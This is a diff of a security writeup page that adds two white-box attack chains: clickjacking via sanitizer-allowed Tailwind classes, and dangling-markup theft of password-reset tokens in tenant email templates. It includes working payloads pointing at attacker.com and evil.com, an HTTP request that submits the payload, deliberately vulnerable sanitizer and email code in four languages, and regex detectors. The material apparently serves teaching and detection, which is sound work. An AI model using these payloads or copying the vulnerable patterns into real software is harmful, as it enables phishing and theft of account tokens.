@@ -390,90 +390,92 @@ Observe that the browser will redirect to a malicious website within a 2-second 
 
 ### White Box
 
+#### Contextual UI Redressing via Sanitizer Namespace Confusion and Global CSS Utility Inheritance
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Focus on Customer Support portals, IT Service Management (ITSM) platforms, or internal Administrative dashboards (e.g., Zendesk, Jira, ServiceNow) where external users can submit rich-text tickets reviewed by internal administrators.
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the backend HTML sanitization pipeline used for rich-text processing
 {% endstep %}
 
 {% step %}
-
+Identify the "Robust XSS Sanitization" architecture. To prevent Stored XSS from compromising high-privilege support agents, the backend developer routes all incoming ticket payloads through an enterprise-grade HTML Sanitizer (e.g., DOMPurify, OWASP Java HTML Sanitizer, HtmlSanitizer)
 {% endstep %}
 
 {% step %}
-
+Investigate the Sanitizer configuration constraints. The business requires users to submit heavily formatted tickets (tables, bold text, colored spans, and functional hyperlinks). To satisfy this, the sanitizer strips all `<script>`, `<iframe>`, and event handlers, but explicitly permits structural tags (e.g., `<a>`, `<div>`, `<span>`) and safe attributes (e.g., `href`, `class`)
 {% endstep %}
 
 {% step %}
-
+Analyze the frontend presentation layer. Modern enterprise dashboards universally employ global CSS utility frameworks (e.g., Tailwind CSS, Bootstrap, or custom utility classes) to rapidly construct UI components. These frameworks inject thousands of global CSS classes directly into the primary DOM namespace
 {% endstep %}
 
 {% step %}
-
+Discover the fatal boundary oversight: The backend developer equates "Absence of JavaScript" with "Inability to execute malicious actions." They assume that because the HTML is structurally inert, it cannot harm the administrative viewer. They fundamentally fail to restrict the `class` attribute namespace
 {% endstep %}
 
 {% step %}
-
+Understand the vulnerability: By permitting the `class` attribute, the sanitizer allows the injected HTML to arbitrarily inherit the highly privileged global CSS rules defined by the enterprise platform
 {% endstep %}
 
 {% step %}
-
+Formulate the UI Redressing (Clickjacking) payload. You must construct a purely structural HTML payload that utilizes the platform's own CSS utility classes to break out of the ticket's bounding box and invisibly overlay a malicious hyperlink across the administrator's screen
 {% endstep %}
 
 {% step %}
-
+Identify the CSS utility classes used by the platform (e.g., inspecting the DOM to find Tailwind classes like `fixed`, `inset-0`, `w-screen`, `h-screen`, `z-[9999]`, `opacity-0`)
 {% endstep %}
 
 {% step %}
-
+Construct the payload: `<a href="[https://attacker.com/admin-phish](https://attacker.com/admin-phish)" class="fixed inset-0 w-screen h-screen z-[9999] opacity-0">invisible</a>`
 {% endstep %}
 
 {% step %}
-
+Submit the ticket to the support queue
 {% endstep %}
 
 {% step %}
-
+The backend HTML Sanitizer evaluates the payload. `<a>` is an allowed tag. `href` is an allowed attribute. `class` is an allowed attribute. The sanitizer mathematically proves no XSS exists and saves the payload
 {% endstep %}
 
 {% step %}
-
+The internal Support Administrator opens the ticket. The frontend SPA renders the sanitized HTML. The browser reads the `class` attribute, applies the platform's global CSS utilities, and stretches the transparent anchor tag across the entire viewport
 {% endstep %}
 
 {% step %}
-
+The Support Administrator attempts to click the native "Approve Refund" or "Close Ticket" button. Because the transparent HTML element overlays the entire Z-axis, the click is intercepted by the anchor tag, seamlessly routing the administrator's active session to the attacker's phishing portal or triggering a cross-site GET state mutation
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
+(\.AllowAttributes\(\s*"class"\s*\)\.OnElements\()|(\.AllowAttributes\(\s*"class"\s*\))|(\.OnElements\([^)]*\))|(\.AllowAttributes\([^)]*"class"[^)]*\))
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
+(policyFactory\.allowAttributes\(\s*"class"\s*\)\.globally\(\))|(allowAttributes\(\s*"class"\s*\))|(\.globally\(\))
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
+(\$config->set\(\s*'HTML\.Allowed'\s*,\s*'.*class.*'\s*\))|(\$config->set\(\s*["']HTML\.Allowed["'])|(\$config->set\([^)]*class[^)]*\))
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
+(sanitizeHtml\([^)]*allowedAttributes\s*:\s*\{[\s\S]*'class')|(allowedAttributes\s*:\s*\{[\s\S]*['"]class['"])|(allowedAttributes\s*:\s*\{[\s\S]*['"]\*['"]\s*:\s*\[[^\]]*['"]class['"])
 ```
 {% endtab %}
 {% endtabs %}
@@ -483,25 +485,25 @@ Observe that the browser will redirect to a malicious website within a 2-second 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
+\.AllowAttributes\(\s*"class"\s*\)\.OnElements\(|\.AllowAttributes\(\s*"class"\s*\)|\.AllowAttributes\(.*class
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
+policyFactory\.allowAttributes\(\s*"class"\s*\)\.globally\(\)|allowAttributes\(\s*"class"\s*\)|\.globally\(
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
+\$config->set\(\s*'HTML\.Allowed'\s*,\s*'.*class.*'|\$config->set\(.*HTML\.Allowed.*class
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
+sanitizeHtml\(.*allowedAttributes.*class|allowedAttributes\s*:\s*\{.*['"]class['"]|allowedAttributes\s*:\s*\{.*['"]\*['"]\s*:\s*\[.*['"]class['"]
 ```
 {% endtab %}
 {% endtabs %}
@@ -511,45 +513,30 @@ new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class ConstraintValidationMiddleware
+public class TicketSanitizationService
 {
-    private readonly FieldDelegate _next;
-    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();
+    private readonly HtmlSanitizer _sanitizer;
 
-    public ConstraintValidationMiddleware(FieldDelegate next)
+    public TicketSanitizationService()
     {
-        _next = next;
-    }
-
-    public async Task InvokeAsync(IMiddlewareContext context)
-    {
+        _sanitizer = new HtmlSanitizer();
+        
         // [1]
         // [2]
-        var field = context.Selection.Field;
-        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");
+        _sanitizer.AllowedTags.Add("div");
+        _sanitizer.AllowedTags.Add("span");
+        _sanitizer.AllowedTags.Add("a");
+        
+        // [3]
+        // [4]
+        // Developer assumes that because 'script' and 'style' tags are blocked, 
+        // passing 'class' attributes is perfectly safe.
+        _sanitizer.AllowedAttributes.Add("class");
+    }
 
-        if (constraintDirective != null)
-        {
-            var pattern = constraintDirective.GetArgument<string>("pattern");
-            
-            // [3]
-            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));
-
-            foreach (var argument in context.Selection.SyntaxNode.Arguments)
-            {
-                var inputString = argument.Value.ToString();
-                
-                // [4]
-                // Blocks the main GraphQL execution pipeline synchronously
-                if (!regex.IsMatch(inputString))
-                {
-                    context.ReportError("Constraint validation failed.");
-                    return;
-                }
-            }
-        }
-
-        await _next(context);
+    public string SanitizeTicketHtml(string rawHtml)
+    {
+        return _sanitizer.Sanitize(rawHtml);
     }
 }
 ```
@@ -557,139 +544,48 @@ public class ConstraintValidationMiddleware
 
 {% tab title="Java" %}
 ```java
-public class ConstraintValidationMiddleware {
+@Service
+public class TicketSanitizationService {
 
-    private final FieldDelegate next;
-
-    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();
-
-    public ConstraintValidationMiddleware(FieldDelegate next) {
-        this.next = next;
-    }
-
-    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {
-
-        // [1]
-        // [2]
-        Field field = context.getSelection().getField();
-
-        Directive constraintDirective = field.getDirectives()
-                .stream()
-                .filter(d -> d.getName().equals("constraint"))
-                .findFirst()
-                .orElse(null);
-
-        if (constraintDirective != null) {
-
-            String pattern = constraintDirective.getArgument("pattern");
-
+    // [1]
+    // [2]
+    // Enterprise HTML sanitizer explicitly configured to allow styling and layout
+    private final PolicyFactory policy = new HtmlPolicyBuilder()
+            .allowElements("a", "div", "span", "p", "b", "i", "table", "tr", "td")
+            .allowUrlProtocols("https", "http")
+            .allowAttributes("href").onElements("a")
             // [3]
-            Pattern regex = compiledConstraints.computeIfAbsent(
-                    field.getName(),
-                    p -> Pattern.compile(pattern)
-            );
+            // [4]
+            // The fatal flaw: permitting the 'class' attribute without validating its contents
+            .allowAttributes("class").globally()
+            .toFactory();
 
-            for (Argument argument : context.getSelection()
-                    .getSyntaxNode()
-                    .getArguments()) {
-
-                String inputString = argument.getValue().toString();
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!regex.matcher(inputString).matches()) {
-
-                    context.reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return CompletableFuture.completedFuture(null);
-                }
-            }
-        }
-
-        return next.invoke(context);
+    public String sanitizeTicketHtml(String rawHtml) {
+        // Removes all JavaScript, completely neutralizing standard XSS
+        return policy.sanitize(rawHtml);
     }
 }
 ```
-
-
 {% endtab %}
 
 {% tab title="PHP" %}
 ```php
-class ConstraintValidationMiddleware
+class TicketSanitizationService
 {
-    private $next;
-
-    private array $compiledConstraints = [];
-
-    public function __construct(callable $next)
-    {
-        $this->next = $next;
-    }
-
-
-    public function invokeAsync($context)
+    public function sanitizeTicketHtml(string $rawHtml): string
     {
         // [1]
         // [2]
-        $field = $context->selection->field;
-
-        $constraintDirective = null;
-
-        foreach ($field->directives as $directive) {
-
-            if ($directive->name === "constraint") {
-                $constraintDirective = $directive;
-                break;
-            }
-        }
-
-
-        if ($constraintDirective !== null) {
-
-            $pattern = $constraintDirective
-                ->getArgument("pattern");
-
-
-            // [3]
-            if (!isset($this->compiledConstraints[$field->name])) {
-
-                $this->compiledConstraints[$field->name] =
-                    $pattern;
-            }
-
-            $regex = $this->compiledConstraints[$field->name];
-
-
-            foreach (
-                $context->selection
-                    ->syntaxNode
-                    ->arguments as $argument
-            ) {
-
-                $inputString = (string)$argument->value;
-
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!preg_match($regex, $inputString)) {
-
-                    $context->reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return null;
-                }
-            }
-        }
-
-
-        return call_user_func(
-            $this->next,
-            $context
-        );
+        $config = \HTMLPurifier_Config::createDefault();
+        
+        // [3]
+        // [4]
+        // Explicitly enables the class attribute on structural elements
+        $config->set('HTML.Allowed', 'a[href|class],div[class],span[class],p,b,i');
+        
+        $purifier = new \HTMLPurifier($config);
+        
+        return $purifier->purify($rawHtml);
     }
 }
 ```
@@ -697,136 +593,157 @@ class ConstraintValidationMiddleware
 
 {% tab title="Node.js" %}
 ```javascript
-const { ApolloGateway } = require('@apollo/gateway');
+const sanitizeHtml = require('sanitize-html');
 
-class ConstraintValidationPlugin {
-    // [1]
-    // [2]
-    // Executes during Supergraph composition
-    requestDidStart({ schema }) {
-        const compiledRegexes = new Map();
-
-        // Recursively extract @constraint directives from the composed schema
-        Object.values(schema.getTypeMap()).forEach(type => {
-            if (type.astNode && type.astNode.directives) {
-                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
-                if (constraint) {
-                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
-                    if (patternArg) {
-                        // [3]
-                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
-                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
-                    }
-                }
-            }
-        });
-
-        return {
-            async executionDidStart({ request }) {
+class TicketSanitizationService {
+    static sanitizeTicketHtml(rawHtml) {
+        // [1]
+        // [2]
+        return sanitizeHtml(rawHtml, {
+            allowedTags: [ 'b', 'i', 'em', 'strong', 'a', 'div', 'p', 'span' ],
+            allowedAttributes: {
+                'a': [ 'href' ],
+                // [3]
                 // [4]
-                // Intercepts variables BEFORE passing the query to the Subgraph
-                for (const [key, value] of Object.entries(request.variables || {})) {
-                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
-                    if (regex && !regex.test(value)) {
-                        throw new Error(`Validation failed for ${key}`);
-                    }
-                }
-            }
-        };
+                // Blindly allows all CSS classes
+                '*': [ 'class' ]
+            },
+            allowedSchemes: [ 'http', 'https' ]
+        });
     }
 }
 ```
 {% endtab %}
 {% endtabs %}
+{% endstep %}
+
+{% step %}
+\[1] The application ingests untrusted rich-text payloads from external users and renders them within highly trusted internal administrative environments, \[2] To prevent devastating Stored XSS attacks, the architecture routes the payload through a strict, battle-tested HTML sanitization library, removing all dynamic execution vectors, \[3] To preserve the formatting and layout required for complex support tickets, the sanitizer is configured to permit the `class` attribute, \[4] The execution sink. The backend developer evaluates HTML safety purely within the context of the HTML specification. They fail to recognize that the frontend SPA utilizes a global CSS utility framework (like Tailwind). By injecting specific utility classes into an allowed tag, the attacker breaks out of the ticket's physical bounding box. The browser applies the enterprise's own trusted CSS rules to the attacker's anchor tag, stretching it invisibly across the entire administrative dashboard, perfectly intercepting clicks and enabling robust UI Redressing without executing a single line of JavaScript
+
+```http
+// 1. Attacker inspects the enterprise dashboard and notices it utilizes Tailwind CSS.
+// 2. Attacker submits a new Support Ticket containing the structural UI Redressing payload.
+
+POST /api/v1/support/tickets HTTP/1.1
+Host: support.enterprise.tld
+Authorization: Bearer <attacker_token>
+Content-Type: application/json
+
+{
+  "subject": "System Error in Billing",
+  "bodyHtml": "<p>Please review my account.</p><a href='https://evil.com/admin-phish' class='fixed inset-0 w-screen h-screen z-[9999] opacity-0 cursor-default'>Click Interceptor</a>"
+}
+
+// 3. The backend HTML Sanitizer verifies <a>, <p>, 'href', and 'class' are allowed.
+// 4. The payload is persisted to the database.
+
+// 5. The Support Administrator opens the ticket in the internal dashboard.
+// 6. The frontend renders the HTML.
+// 7. The browser engine parses `fixed inset-0 w-screen h-screen z-[9999] opacity-0`.
+// 8. The transparent anchor tag detaches from the document flow and overlays the entire viewport.
+// 9. The Administrator moves their mouse to click the "Issue Refund" button.
+// 10. The click registers on the invisible <a> tag, immediately navigating the admin's session 
+//     to the attacker's credential harvesting portal.
+```
+{% endstep %}
+
+{% step %}
+To allow rich communication while mitigating Stored XSS, engineers deployed strict server-side HTML sanitization pipelines. This defense model equated JavaScript elimination with absolute structural safety. Developers explicitly authorized the `class` attribute to maintain basic visual fidelity, assuming CSS was contextually bound to the rendering container. The vulnerability emerged from a namespace collision between the sanitized HTML and the frontend's global CSS utility framework. The attacker bypassed the backend's logical intent by supplying perfectly legitimate HTML tags decorated with the enterprise's own highly privileged CSS classes. When rendered, the browser honored the cascading stylesheets, breaking the element out of its localized container and overlaying it across the entire administrative viewport. This structural injection successfully weaponized the application's presentation layer against its operators, executing a seamless Clickjacking attack within a single, trusted origin
 {% endstep %}
 {% endstepper %}
 
 ***
 
+#### Token Exfiltration via Sequential Concatenation in Dangling Markup
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Focus on asynchronous communication pipelines where tenant-provided data is concatenated with highly sensitive system data (e.g., Transactional Email engines, PDF Invoice generators, or automated SMS dispatchers)
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the application's rendering and dispatch sequence
 {% endstep %}
 
 {% step %}
-
+Identify the "Template Concatenation" architecture. In B2B platforms, enterprise tenants can customize the "Welcome" or "Password Reset" emails sent to their users. To accomplish this, the backend stores the tenant's Custom HTML Body in the database
 {% endstep %}
 
 {% step %}
-
+Investigate the Email Dispatch pipeline. When a user requests a password reset, the backend initiates the email assembly. It fetches the tenant's Custom HTML Body, sanitizes it to remove malicious scripts, and then sequentially concatenates the system's sensitive data (e.g., the secure Password Reset URL, un-hashed authentication tokens, or one-time passwords) directly _below_ the tenant's HTML
 {% endstep %}
 
 {% step %}
-
+Analyze the Sanitization logic. Because standard email clients (Outlook, Gmail) strip JavaScript natively, the backend developer uses a lightweight HTML sanitizer that allows structural tags (e.g., `<img src="...">`, `<a href="...">`, `<table>`)
 {% endstep %}
 
 {% step %}
-
+Discover the fatal validation gap: The backend sanitizer parses the HTML utilizing a strict DOM tree representation to ensure the tags are safe. However, after sanitization, the backend uses raw string concatenation to append the sensitive system token (e.g., `$finalEmail = $tenantHtml . "<br>Reset Link: " . $secureToken;`)
 {% endstep %}
 
 {% step %}
-
+Understand the Dangling Markup vulnerability: HTML parsers in client applications (like browsers or email clients) are notoriously fault-tolerant. If an HTML tag opens an attribute with a quote (e.g., `src='`) but fails to close it, the parser will continue consuming all subsequent plaintext in the document until it encounters the next matching quote
 {% endstep %}
 
 {% step %}
-
+Formulate the Exfiltration payload. You must supply a custom HTML body containing an unclosed tag that instructs the client to execute an outbound HTTP request (e.g., an `<img>` or `<style>` tag)
 {% endstep %}
 
 {% step %}
-
+Construct the payload: `<img src='[https://attacker.com/leak?data=](https://attacker.com/leak?data=)`. Note the deliberate omission of the closing single quote and angle bracket
 {% endstep %}
 
 {% step %}
-
+Authenticate to the Tenant Administration dashboard and update the Custom Email Template with your payload
 {% endstep %}
 
 {% step %}
-
+The backend sanitizer attempts to parse your payload. Depending on the library, it may "auto-correct" the tag by appending the closing quote. If it does not auto-correct (or if you exploit parser differentials between the sanitizer and the email client), the unclosed string is saved to the database
 {% endstep %}
 
 {% step %}
-
+Trigger the dispatch event (e.g., initiate a Password Reset for a target user)
 {% endstep %}
 
 {% step %}
-
+The backend concatenates your malicious, unclosed HTML with the highly sensitive system token and dispatches the email44
 {% endstep %}
 
 {% step %}
+The victim's email client receives the HTML. It parses `<img src='[https://attacker.com/leak?data=](https://attacker.com/leak?data=)`. Searching for the closing quote, it eagerly consumes the system's concatenated text: `<br>Reset Link: [https://enterprise.tld/reset?token=SECRET_XYZ](https://enterprise.tld/reset?token=SECRET_XYZ)`
+{% endstep %}
 
+{% step %}
+The email client attempts to render the image, issuing an HTTP GET request to `[https://attacker.com/leak?data=](https://attacker.com/leak?data=)<br>Reset Link: [https://enterprise.tld/reset?token=SECRET_XYZ](https://enterprise.tld/reset?token=SECRET_XYZ)`. The attacker perfectly intercepts the secure, out-of-band communication token without executing a single line of JavaScript
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
+(string\s+\w+\s*=\s*\w*Template\s*\+\s*\$"<a[^>]*\{[^}]+\})|(emailBuilder\s*\.\s*Append\s*\(\s*\w*Template\s*\)\s*\.Append\s*\(\s*\w*(?:Token|Secret|Key|Link|Url)\s*\))|(\w*Template\s*\+\s*\w*(?:Token|Secret|Key|ResetLink|MagicLink))
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
+(String\s+\w+\s*=\s*\w*Template\s*\+\s*.*(?:token|secret|link))|(emailBuilder\.append\(\w*Template\)\.append\(\w*(?:Token|Secret|Key|Link|Url)\))|(append\(\w*Template\)\.append\([^)]*(?:Token|Secret|Link)\))
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
+(\$\w+\s*=\s*\$\w*Template\s*\.\s*.*\.\s*\$\w*(?:Token|Secret|Key|Link))|(\$finalHtml\s*=\s*\$[A-Za-z_][A-Za-z0-9_]*Template\s*\.)|(\.\s*\$(?:resetLink|magicLink|token|secret|apiKey))
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
+(let\s+\w+\s*=\s*`\$\{\w*Template\}[\s\S]*\$\{(?:token|secret|resetLink|magicLink|apiKey|secureToken)\}`)|(const\s+\w+\s*=\s*`\$\{\w*Template\}[\s\S]*\$\{(?:token|secret|link)\}`)|(\$\{\w*Template\}[\s\S]*\$\{(?:secureToken|resetLink|magicLink)\})
 ```
 {% endtab %}
 {% endtabs %}
@@ -836,25 +753,25 @@ class ConstraintValidationPlugin {
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
+\w*Template\s*\+\s*\w*(Token|Secret|Key|ResetLink|MagicLink)|emailBuilder\.Append\(.*Template.*\)\.Append\(.*(Token|Secret|Link)
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
+emailBuilder\.append\(.*Template.*\)\.append\(.*(Token|Secret|Key|Link)|String\s+\w+\s*=.*Template.*(token|secret|link)
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
+\$[A-Za-z_][A-Za-z0-9_]*Template\s*\..*\$(Token|Secret|Key|resetLink|magicLink)|\$finalHtml\s*=.*Template
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
+\$\{.*Template\}.*\$\{(token|secret|resetLink|magicLink|secureToken)\}|let\s+\w+\s*=.*secureToken
 ```
 {% endtab %}
 {% endtabs %}
@@ -864,45 +781,24 @@ new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class ConstraintValidationMiddleware
+public class EmailDispatchService
 {
-    private readonly FieldDelegate _next;
-    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();
-
-    public ConstraintValidationMiddleware(FieldDelegate next)
-    {
-        _next = next;
-    }
-
-    public async Task InvokeAsync(IMiddlewareContext context)
+    public async Task SendPasswordResetAsync(User user, string resetToken)
     {
         // [1]
         // [2]
-        var field = context.Selection.Field;
-        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");
+        var tenantConfig = await _dbContext.TenantConfigs.FindAsync(user.TenantId);
+        var customHtml = _htmlSanitizer.Sanitize(tenantConfig.EmailTemplate);
 
-        if (constraintDirective != null)
-        {
-            var pattern = constraintDirective.GetArgument<string>("pattern");
-            
-            // [3]
-            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));
+        // [3]
+        // [4]
+        // The HTML structure is finalized via raw string concatenation.
+        var sb = new StringBuilder();
+        sb.Append(customHtml);
+        sb.Append("<br><br>Please reset your password using this secure token: ");
+        sb.Append(resetToken);
 
-            foreach (var argument in context.Selection.SyntaxNode.Arguments)
-            {
-                var inputString = argument.Value.ToString();
-                
-                // [4]
-                // Blocks the main GraphQL execution pipeline synchronously
-                if (!regex.IsMatch(inputString))
-                {
-                    context.ReportError("Constraint validation failed.");
-                    return;
-                }
-            }
-        }
-
-        await _next(context);
+        await _smtpClient.SendHtmlEmailAsync(user.Email, "Reset Password", sb.ToString());
     }
 }
 ```
@@ -910,139 +806,50 @@ public class ConstraintValidationMiddleware
 
 {% tab title="Java" %}
 ```java
-public class ConstraintValidationMiddleware {
+@Service
+public class EmailDispatchService {
 
-    private final FieldDelegate next;
+    @Autowired
+    private TenantConfigRepository configRepo;
+    @Autowired
+    private EmailProvider emailProvider;
 
-    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();
-
-    public ConstraintValidationMiddleware(FieldDelegate next) {
-        this.next = next;
-    }
-
-    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {
-
+    public void sendPasswordReset(User user, String resetToken) {
         // [1]
         // [2]
-        Field field = context.getSelection().getField();
+        TenantConfig config = configRepo.findById(user.getTenantId()).orElseThrow();
+        String customHtml = sanitizeHtml(config.getCustomEmailBody());
 
-        Directive constraintDirective = field.getDirectives()
-                .stream()
-                .filter(d -> d.getName().equals("constraint"))
-                .findFirst()
-                .orElse(null);
+        // [3]
+        // [4]
+        // The system token is physically adjacent to the untrusted, unclosed tag.
+        String finalEmailBody = customHtml + 
+                "<br/><br/>Your secure reset token is: <strong>" + resetToken + "</strong>";
 
-        if (constraintDirective != null) {
-
-            String pattern = constraintDirective.getArgument("pattern");
-
-            // [3]
-            Pattern regex = compiledConstraints.computeIfAbsent(
-                    field.getName(),
-                    p -> Pattern.compile(pattern)
-            );
-
-            for (Argument argument : context.getSelection()
-                    .getSyntaxNode()
-                    .getArguments()) {
-
-                String inputString = argument.getValue().toString();
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!regex.matcher(inputString).matches()) {
-
-                    context.reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return CompletableFuture.completedFuture(null);
-                }
-            }
-        }
-
-        return next.invoke(context);
+        emailProvider.sendHtmlEmail(user.getEmail(), "Password Reset", finalEmailBody);
     }
 }
 ```
-
-
 {% endtab %}
 
 {% tab title="PHP" %}
 ```php
-class ConstraintValidationMiddleware
+class EmailDispatchService
 {
-    private $next;
-
-    private array $compiledConstraints = [];
-
-    public function __construct(callable $next)
-    {
-        $this->next = $next;
-    }
-
-
-    public function invokeAsync($context)
+    public function sendPasswordReset($user, $resetToken)
     {
         // [1]
         // [2]
-        $field = $context->selection->field;
+        $tenantTemplate = DB::table('tenant_settings')->where('id', $user->tenant_id)->value('email_body');
 
-        $constraintDirective = null;
+        // [3]
+        // [4]
+        // Developer assumes the tenant template is completely isolated from the system string.
+        // If the tenant template ends with an unclosed HTML attribute (e.g., <img src="http://evil.com/leak?),
+        // the client's HTML parser will absorb the subsequent sensitive string into the outbound URL.
+        $finalHtml = $tenantTemplate . "<br><br><b>Secure Reset Link:</b> https://auth.enterprise.tld/reset?token=" . $resetToken;
 
-        foreach ($field->directives as $directive) {
-
-            if ($directive->name === "constraint") {
-                $constraintDirective = $directive;
-                break;
-            }
-        }
-
-
-        if ($constraintDirective !== null) {
-
-            $pattern = $constraintDirective
-                ->getArgument("pattern");
-
-
-            // [3]
-            if (!isset($this->compiledConstraints[$field->name])) {
-
-                $this->compiledConstraints[$field->name] =
-                    $pattern;
-            }
-
-            $regex = $this->compiledConstraints[$field->name];
-
-
-            foreach (
-                $context->selection
-                    ->syntaxNode
-                    ->arguments as $argument
-            ) {
-
-                $inputString = (string)$argument->value;
-
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!preg_match($regex, $inputString)) {
-
-                    $context->reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return null;
-                }
-            }
-        }
-
-
-        return call_user_func(
-            $this->next,
-            $context
-        );
+        Mail::to($user->email)->send(new ResetPasswordMail($finalHtml));
     }
 }
 ```
@@ -1050,136 +857,173 @@ class ConstraintValidationMiddleware
 
 {% tab title="Node.js" %}
 ```javascript
-const { ApolloGateway } = require('@apollo/gateway');
+class EmailDispatchService {
+    static async sendPasswordReset(user, resetToken) {
+        // [1]
+        // [2]
+        let tenantConfig = await TenantConfig.findByPk(user.tenantId);
+        let customHtml = sanitizeHtml(tenantConfig.customEmailBody);
 
-class ConstraintValidationPlugin {
-    // [1]
-    // [2]
-    // Executes during Supergraph composition
-    requestDidStart({ schema }) {
-        const compiledRegexes = new Map();
+        // [3]
+        // [4]
+        // String interpolation inherently merges the trust boundaries.
+        // The unclosed tag in 'customHtml' overflows into the secure token string.
+        let finalEmailBody = `
+            <div>${customHtml}</div>
+            <hr>
+            <p>Click here to reset your password: https://auth.enterprise.tld/reset?t=${resetToken}</p>
+        `;
 
-        // Recursively extract @constraint directives from the composed schema
-        Object.values(schema.getTypeMap()).forEach(type => {
-            if (type.astNode && type.astNode.directives) {
-                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
-                if (constraint) {
-                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
-                    if (patternArg) {
-                        // [3]
-                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
-                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
-                    }
-                }
-            }
+        await emailProvider.send({
+            to: user.email,
+            subject: 'Password Reset',
+            html: finalEmailBody
         });
-
-        return {
-            async executionDidStart({ request }) {
-                // [4]
-                // Intercepts variables BEFORE passing the query to the Subgraph
-                for (const [key, value] of Object.entries(request.variables || {})) {
-                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
-                    if (regex && !regex.test(value)) {
-                        throw new Error(`Validation failed for ${key}`);
-                    }
-                }
-            }
-        };
